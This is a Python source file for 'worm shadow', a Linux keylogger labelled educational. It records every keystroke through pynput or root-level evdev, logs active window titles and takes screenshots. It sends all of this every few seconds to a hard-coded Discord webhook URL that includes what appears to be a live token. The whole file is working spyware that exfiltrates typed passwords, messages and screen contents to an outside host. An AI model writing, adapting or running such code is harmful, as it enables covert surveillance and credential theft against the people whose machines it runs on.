#!/usr/bin/env python3
# worm shadow — kali linux all-in-one logger (educational)
import os
import sys
import time
import threading
import subprocess
import datetime
import re
import shutil
import json
import glob
from pathlib import Path

# ================= CONFIG =================
WEBHOOK_URL = "https://discord.com/api/webhooks/1558530892736241726/JIDYqHtJXL3xKSmdjRekY2PRrP6kHIeFABNNBuleqxf1_KL0TsPciVB098Grav1tk3ut"
WEBHOOK_INTERVAL = 5
WEBHOOK_BATCH_MAX = 30
SEND_SCREENSHOTS = True
VERBOSE_KEYS = True        # jede taste im terminal zeigen (debug)
# ==========================================

# ---------- http backend ----------
try:
    import requests
    def http_post_json(url, payload):
        r = requests.post(url, json=payload, timeout=15,
                          headers={"User-Agent": "Mozilla/5.0 worm-shadow"})
        return r.status_code, r.text[:300]
    def http_post_multipart(url, payload_json, file_field, file_path, filename):
        with open(file_path, "rb") as f:
            files = {file_field: (filename, f, "image/png")}
            data = {"payload_json": payload_json}
            r = requests.post(url, data=data, files=files, timeout=30,
                              headers={"User-Agent": "Mozilla/5.0 worm-shadow"})
        return r.status_code, r.text[:300]
    HTTP_BACKEND = "requests"
except ImportError:
    import urllib.request
    import urllib.error
    def http_post_json(url, payload):
        try:
            data = json.dumps(payload).encode()
            req = urllib.request.Request(url, data=data, headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 worm-shadow"})
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, r.read().decode(errors="ignore")[:300]
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="ignore")[:300]
        except Exception as e:
            return -1, str(e)
    def http_post_multipart(url, payload_json, file_field, file_path, filename):
        boundary = "----wormshadow" + str(int(time.time() * 1000))
        with open(file_path, "rb") as f:
            file_data = f.read()
        body = b""
        body += f"--{boundary}\r\n".encode()
        body += b'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
        body += payload_json.encode() + b"\r\n"
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'.encode()
        body += b"Content-Type: image/png\r\n\r\n"
        body += file_data + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        try:
            req = urllib.request.Request(url, data=body, headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": "Mozilla/5.0 worm-shadow"})
            with urllib.request.urlopen(req, timeout=30) as r:
                return r.status, r.read().decode(errors="ignore")[:300]
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="ignore")[:300]
        except Exception as e:
            return -1, str(e)
    HTTP_BACKEND = "urllib"

# ---------- deps ----------
missing = []
try:
    import mss
    import mss.tools
except ImportError:
    missing.append("mss")
try:
    from pynput import keyboard as pynput_kb
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
try:
    import evdev
    from evdev import ecodes
    HAS_EVDEV = True
except ImportError:
    HAS_EVDEV = False

if missing:
    print(f"[worm shadow] missing deps: {', '.join(missing)}")
    print("[worm shadow] run: python3 setup1.py")
    sys.exit(1)

# ---------- runtime detection (env-var-safe, sudo-safe) ----------
IS_ROOT = (os.geteuid() == 0)

def detect_wayland():
    """wayland-erkennung, robust gegen sudo env-stripping."""
    # 1. env var (geht verloren bei sudo, aber prüfen kostet nichts)
    if os.environ.get("XDG_SESSION_TYPE", "").lower() == "wayland":
        return True
    if os.environ.get("WAYLAND_DISPLAY"):
        return True
    # 2. socket-file: /run/user/<uid>/wayland-*
    for base in ("/run/user", "/tmp"):
        if not os.path.isdir(base):
            continue
        for entry in os.listdir(base):
            if entry.startswith("wayland-"):
                return True
            sub = os.path.join(base, entry)
            if os.path.isdir(sub):
                try:
                    for f in os.listdir(sub):
                        if f.startswith("wayland-"):
                            return True
                except PermissionError:
                    pass
    return False

IS_WAYLAND = detect_wayland()

# ---------- paths ----------
LOG_DIR = Path("logs")
SHOT_DIR = Path("screenshots")
KEY_LOG = LOG_DIR / "keylog.txt"
WIN_LOG = LOG_DIR / "windowlog.txt"
SCREENSHOT_ENABLED = False

# ---------- helpers ----------
def ensure_dirs():
    LOG_DIR.mkdir(exist_ok=True)
    SHOT_DIR.mkdir(exist_ok=True)


def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def safe_filename(s):
    s = re.sub(r'[^\w\s-]', '', s).strip()
    s = re.sub(r'[-\s]+', '_', s)
    return s[:80] or "unknown"


def append(path, line):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
            f.flush()
    except Exception as e:
        print(f"[worm shadow] log write error: {e}")

# ---------- window title ----------
def get_active_window_title():
    if shutil.which("xdotool"):
        try:
            out = subprocess.check_output(
                ["xdotool", "getactivewindow", "getwindowname"],
                stderr=subprocess.DEVNULL, timeout=1)
            t = out.decode(errors="ignore").strip()
            if t:
                return t
        except Exception:
            pass
    if IS_WAYLAND and shutil.which("gdbus"):
        try:
            out = subprocess.check_output(
                ["gdbus", "call", "--session",
                 "--dest", "org.gnome.Shell",
                 "--object-path", "/org/gnome/Shell",
                 "--method", "org.gnome.Shell.Eval",
                 "global.get_window_actors().map(a=>a.meta_window.get_title()).join('|')"],
                stderr=subprocess.DEVNULL, timeout=1)
            s = out.decode(errors="ignore")
            m = re.search(r"'([^']*)'", s)
            if m and m.group(1):
                return m.group(1).split("|")[-1]
        except Exception:
            pass
    return None

# ---------- backend: pynput ----------
def run_pynput_backend():
    print("[worm shadow] backend: pynput (x11)")
    def on_press(key):
        try:
            if hasattr(key, "char") and key.char is not None:
                line = f"{ts()} | {key.char}"
                if VERBOSE_KEYS:
                    print(f"[key] {key.char}", flush=True)
            else:
                line = f"{ts()} | [{key}]"
                if VERBOSE_KEYS:
                    print(f"[key] [{key}]", flush=True)
            append(KEY_LOG, line)
        except Exception:
            pass
    listener = pynput_kb.Listener(on_press=on_press)
    listener.start()
    return listener

# ---------- backend: evdev ----------
KEY_NAMES = {}
if HAS_EVDEV:
    for name in dir(ecodes):
        if name.startswith("KEY_"):
            code = getattr(ecodes, name)
            if isinstance(code, int):
                KEY_NAMES.setdefault(code, name[4:])

def find_keyboard_devices():
    """listet alle /dev/input/event* die EV_KEY können."""
    found = []
    for path in sorted(glob.glob("/dev/input/event*")):
        try:
            d = evdev.InputDevice(path)
            caps = d.capabilities(verbose=False)
            if ecodes.EV_KEY in caps:
                # keyboard has lots of KEY_ codes; mouse has only BTN_*
                key_codes = caps[ecodes.EV_KEY]
                # filter out obvious mice: they only have BTN_* codes
                is_mouse = all(c >= ecodes.BTN_MISC for c in key_codes) if key_codes else False
                found.append((d, path, is_mouse))
        except Exception:
            continue
    return found


def run_evdev_backend():
    if not HAS_EVDEV:
        print("[worm shadow] evdev not installed")
        return []
    if not IS_ROOT:
        print("[worm shadow] evdev braucht root. starte mit sudo.")
        return []

    devices_info = find_keyboard_devices()
    if not devices_info:
        print("[worm shadow] keine /dev/input devices gefunden.")
        return []

    print(f"[worm shadow] backend: evdev — {len(devices_info)} device(s):")
    for d, path, is_mouse in devices_info:
        kind = "mouse" if is_mouse else "keyboard"
        print(f"  {path} — {d.name} ({kind})")

    def read_device(dev, path):
        try:
            for event in dev.read_loop():
                if event.type == ecodes.EV_KEY and event.value == 1:
                    name = KEY_NAMES.get(event.code, f"key_{event.code}")
                    line = f"{ts()} | [{name}]"
                    if VERBOSE_KEYS:
                        print(f"[key {path}] {name}", flush=True)
                    append(KEY_LOG, line)
        except Exception as e:
            print(f"[worm shadow] read error on {path}: {e}")

    threads = []
    for d, path, _ in devices_info:
        t = threading.Thread(target=read_device, args=(d, path), daemon=True)
        t.start()
        threads.append(t)
    return threads

# ---------- window monitor ----------
def window_monitor(stop_event):
    last = None
    while not stop_event.is_set():
        title = get_active_window_title()
        if title and title != last:
            last = title
            append(WIN_LOG, f"{ts()} | {title}")
            print(f"[win] {title}", flush=True)
            if SCREENSHOT_ENABLED:
                take_screenshot(title)
        time.sleep(1)

# ---------- screenshots ----------
def take_screenshot(title):
    if not SCREENSHOT_ENABLED:
        return None
    try:
        with mss.mss() as sct:
            mon = sct.monitors[1]
            img = sct.grab(mon)
            stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"{stamp}_{safe_filename(title)}.png"
            path = SHOT_DIR / fname
            mss.tools.to_png(img.rgb, img.size, output=str(path))
            print(f"[shot] {path.name}", flush=True)
            return path
    except Exception as e:
        print(f"[worm shadow] screenshot error: {e}")
        return None

# ---------- webhook ----------
def send_test_ping():
    payload = {"content": f"[worm shadow] online — host: `{os.uname().nodename}` | backend: `{HTTP_BACKEND}`"}
    code, body = http_post_json(WEBHOOK_URL, payload)
    print(f"[worm shadow] webhook test → HTTP {code}")
    if code not in (200, 204):
        print(f"[worm shadow] webhook response: {body}")
    return code in (200, 204)


class WebhookSender(threading.Thread):
    def __init__(self, url, stop_event):
        super().__init__(daemon=True)
        self.url = url
        self.stop_event = stop_event
        self.key_pos = 0
        self.win_pos = 0
        self.shot_pos = 0
        self.first_run = True

    def _read_new(self, path, pos):
        if not path.exists():
            return [], pos
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                f.seek(pos)
                lines = f.read().splitlines()
                new_pos = f.tell()
            return lines, new_pos
        except Exception:
            return [], pos

    def run(self):
        print("[worm shadow] webhook sender running")
        while not self.stop_event.is_set():
            if not self.first_run:
                time.sleep(WEBHOOK_INTERVAL)
            self.first_run = False
            try:
                key_lines, self.key_pos = self._read_new(KEY_LOG, self.key_pos)
                win_lines, self.win_pos = self._read_new(WIN_LOG, self.win_pos)

                if key_lines:
                    print(f"[worm shadow] sending {len(key_lines)} key lines")
                    for i in range(0, len(key_lines), WEBHOOK_BATCH_MAX):
                        chunk = key_lines[i:i + WEBHOOK_BATCH_MAX]
                        payload = {"embeds": [{
                            "title": "keylog",
                            "description": "```\n" + "\n".join(chunk) + "\n```"[:3900],
                            "color": 0x9b59b6,
                            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                        }]}
                        code, body = http_post_json(self.url, payload)
                        if code not in (200, 204):
                            print(f"[worm shadow] key send failed: HTTP {code} — {body}")

                if win_lines:
                    print(f"[worm shadow] sending {len(win_lines)} window lines")
                    for i in range(0, len(win_lines), WEBHOOK_BATCH_MAX):
                        chunk = win_lines[i:i + WEBHOOK_BATCH_MAX]
                        payload = {"embeds": [{
                            "title": "windows / tabs",
                            "description": "```\n" + "\n".join(chunk) + "\n```"[:3900],
                            "color": 0x3498db,
                            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                        }]}
                        code, body = http_post_json(self.url, payload)
                        if code not in (200, 204):
                            print(f"[worm shadow] win send failed: HTTP {code} — {body}")

                if SEND_SCREENSHOTS and SCREENSHOT_ENABLED:
                    shots = sorted(SHOT_DIR.glob("*.png"))
                    if len(shots) > self.shot_pos:
                        for shot in shots[self.shot_pos:]:
                            print(f"[worm shadow] uploading {shot.name}")
                            payload_json = json.dumps({"content": f"screenshot: `{shot.name}`"})
                            code, body = http_post_multipart(self.url, payload_json, "file", str(shot), shot.name)
                            if code not in (200, 204):
                                print(f"[worm shadow] shot upload failed: HTTP {code} — {body}")
                        self.shot_pos = len(shots)
            except Exception as e:
                print(f"[worm shadow] webhook loop error: {e}")

# ---------- main ----------
def main():
    global SCREENSHOT_ENABLED
    ensure_dirs()

    print("[worm shadow] linux all-in-one logger (kali)")
    print(f"  session:     {'wayland' if IS_WAYLAND else 'x11/unknown'}")
    print(f"  root:        {IS_ROOT}")
    print(f"  http:        {HTTP_BACKEND}")
    print(f"  webhook:     {'set' if WEBHOOK_URL else 'NOT SET'}")
    print(f"  logs:        {LOG_DIR.resolve()}")
    print(f"  screenshots: {SHOT_DIR.resolve()}")

    if not WEBHOOK_URL:
        print("[worm shadow] WARNING: WEBHOOK_URL empty.")
        sys.exit(1)

    send_test_ping()

    # backend wahl — evdev hat vorrang wenn wir root sind und evdev da ist
    # das funktioniert auf wayland UND x11, also nehmen wir es wenn möglich immer.
    listener = None
    ev_threads = []

    use_evdev = HAS_EVDEV and IS_ROOT
    use_pynput = HAS_PYNPUT and not IS_WAYLAND

    if use_evdev:
        ev_threads = run_evdev_backend()
        if not ev_threads:
            print("[worm shadow] evdev nichts gelesen — fallback auf pynput versuchen")
            use_evdev = False

    if not ev_threads:
        if use_pynput:
            listener = run_pynput_backend()
        elif HAS_PYNPUT:
            print("[worm shadow] wayland ohne root — pynput kriegt nichts. exit.")
            print("[worm shadow] starte mit: sudo .venv/bin/python keylogger.py")
            sys.exit(1)
        else:
            print("[worm shadow] kein backend verfügbar. exit.")
            sys.exit(1)

    choice = input("Enable screenshots? (y/N): ").strip().lower()
    if choice != "y":
        print("[worm shadow] no screenshots. closing.")
        if listener:
            listener.stop()
        sys.exit(0)

    SCREENSHOT_ENABLED = True
    print("[worm shadow] screenshots on. logging. ctrl+c to stop.")
    print("[worm shadow] tipp was — du solltest [key ...] zeilen sehen.")

    stop_event = threading.Event()
    wm_thread = threading.Thread(target=window_monitor, args=(stop_event,), daemon=True)
    wm_thread.start()

    sender = WebhookSender(WEBHOOK_URL, stop_event)
    sender.start()

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[worm shadow] stopping...")
        stop_event.set()
        if listener:
            listener.stop()
        print("[worm shadow] stopped. later, he.")


if __name__ == "__main__":
    main()
